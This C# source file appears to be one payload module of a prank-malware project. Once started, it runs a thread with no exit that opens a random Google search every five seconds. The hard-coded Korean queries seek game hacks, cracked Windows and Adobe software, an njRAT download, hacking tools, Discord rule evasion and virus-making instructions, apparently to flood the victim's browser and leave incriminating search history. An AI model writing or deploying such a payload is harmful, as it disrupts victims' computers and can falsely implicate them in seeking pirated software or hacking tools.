using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace LastNight.Payloads
{
    public class OpenWebsites
    {
        string[] websites = { "https://www.google.com/search?q=마인크래프트+1.5.2+다운로드", "https://www.google.com/search?q=SEUS+PTGI+다운로드", "https://www.google.com/search?q=배그+무료+다운", "https://www.google.com/search?q=배그핵+다운로드", "https://www.google.com/search?q=하이픽셀+핵+다운로드", "https://www.google.com/search?q=윈도우+구매없이+다운로드", "https://www.google.com/search?q=어몽어스+핵+스크립트", "https://www.google.com/search?q=njrat+다운로드", "https://www.google.com/search?q=해킹툴+무료+다운로드", "https://www.google.com/search?q=디스코드+이용약관+위반+우회", "https://www.google.com/search?q=어도비+cc+2020+크랙+다운로드", "https://www.google.com/search?q=%EB%B0%94%EC%9D%B4%EB%9F%AC%EC%8A%A4+%EB%A7%8C%EB%93%9C%EB%8A%94+%EB%B2%95" };

        public void RunPayload()
        {
            Thread thr = new Thread(new ThreadStart(() =>
            {
                while (true)
                {
                    Process.Start(websites[new Random().Next(0, websites.Length)]);
                    Thread.Sleep(5000);
                }
            }));
            thr.Start();
        }
    }
}
